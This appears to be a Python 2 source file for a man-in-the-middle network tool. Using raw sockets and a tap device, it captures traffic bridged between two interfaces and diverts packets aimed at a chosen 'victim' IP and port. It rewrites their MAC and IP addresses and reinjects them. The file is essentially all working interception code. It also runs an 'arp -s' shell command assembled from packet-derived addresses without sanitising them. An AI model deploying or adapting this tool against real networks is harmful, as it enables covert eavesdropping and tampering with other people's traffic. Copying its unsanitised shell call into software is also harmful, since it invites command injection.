import os
import struct
from threading import *
from ConfigParser import *
from pdb import *
from scapy.all import *
from socket import *
import fcntl
import Queue

MTU = 32676     # read from socket without bothering maximum transfer unit
ETH_P_ALL = 0x03  # capture all bytes of packet including ethernet layer

ip_src = 0x1a       # position of ip source address in packet
ip_dst = 0x1e       # position of ip destination address in packet
port_dst = 0x24     # position of destination port address in packet

# read from tap device without bothering maximum transfer unit
BUFFERSIZE_DEV = 65000

TUNSETIFF = 0x400454ca  # attach to tun/tap device
IFF_TAP = 0x0002    # utilize tap device, i.e. including ethernet layer
IFF_NO_IP = 0x1000  # omit packet information that is added by kernel


tap_device = os.open('/dev/net/tun', os.O_RDWR)
flags = struct.pack('16sH', "tap0", IFF_TAP | IFF_NO_IP)
fcntl.ioctl(tap_device, TUNSETIFF, flags)


class sniffer():

    def __init__(self, iface0, iface1, mitm_in, mitm_out, dst_ip, dst_mac, victim_dstPort, control_queue):

        self.dst_ip = dst_ip
        self.dst_mac = dst_mac
        self.victim_dstPort = int(victim_dstPort)

        self.control_queue = control_queue
        # traffic going from bridged interfaces to man-in-the-middle interface
        if mitm_in:
            self.s_iface0 = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))
            self.s_iface0.bind((iface0, ETH_P_ALL))

            self.s_iface1 = socket(AF_PACKET, SOCK_RAW)
            self.s_iface1.bind((iface1, ETH_P_ALL))

            self.receive = self.socket_receive
            self.send = lambda pkt: self.s_iface1.send(pkt)
            self.redirect = self.device_send

        # traffic going from man-in-the-middle interface to bridged interfaces
        if mitm_out:
            self.s_iface0 = socket(AF_PACKET, SOCK_RAW)
            self.s_iface0.bind((iface0, ETH_P_ALL))

            self.s_iface1 = socket(AF_PACKET, SOCK_RAW)
            self.s_iface1.bind((iface1, ETH_P_ALL))

            self.receive = self.device_receive
            self.send = lambda pkt: self.s_iface0.send(pkt)
            self.redirect = lambda pkt: self.s_iface1.send(pkt)

    # traffic is intercepted based on destination ip address and destination
    # port
    def intercept(self, pkt_ip, pkt_port):

        if inet_aton(self.dst_ip) == pkt_ip:
            if pkt_port:
                # set_trace()
                if struct.pack(">H", self.victim_dstPort) == pkt_port:
                    print "intercepting packet: " + str(self.dst_ip) + ":" + str(self.victim_dstPort)
                    return True
                return True
            else:
                return True
        return False

    # traffic leaving man-in-the-middle interface is written back to original
    # addresses
    def device_receive(self):
        try:
            p = os.read(tap_device, BUFFERSIZE_DEV)
            pkt_scapy = Ether(p)
            if pkt_scapy.getlayer("IP"):
                pkt_scapy[Ether].dst = "ca:49:a2:08:8f:c7"  # self.dst_mac
                pkt_scapy[IP].src = self.dst_ip
                del pkt_scapy[IP].chksum
            if pkt_scapy.getlayer("TCP"):
                del pkt_scapy[TCP].chksum
            return str(pkt_scapy)
        except error:
            pass

    # traffic to man-in-the-middle interface is modified so it goes through
    # tcp/ip stack
    def device_send(self, pkt):
        try:
            pkt_scapy = Ether(pkt)
            del pkt_scapy[IP].chksum
            if TCP in pkt_scapy:
                del pkt_scapy[TCP].chksum
            os.system(
                "arp -s " + pkt_scapy[IP].src + " " + pkt_scapy[Ether].src)
            pkt_scapy[Ether].dst = "0e:33:7e:2f:19:61"
            pkt_scapy[IP].dst = "1.2.3.4"
            os.write(tap_device, str(pkt_scapy))
        except error:
            pass

    def socket_receive(self):
        pkt, sa = self.s_iface0.recvfrom(MTU)
        if sa[2] != PACKET_OUTGOING:
            return pkt

    def recv_send_loop(self):
        pkt = ""
        finish = False
        while not finish:
            try:
                pkt = self.receive()
            except error:
                pass

            if pkt:
                if self.intercept(pkt[ip_src:][:4], None) or self.intercept(pkt[ip_dst:][:4], pkt[port_dst:][:2]):
                    self.redirect(pkt)
                else:
                    self.send(pkt)

            if not self.control_queue.empty():
                finish = True
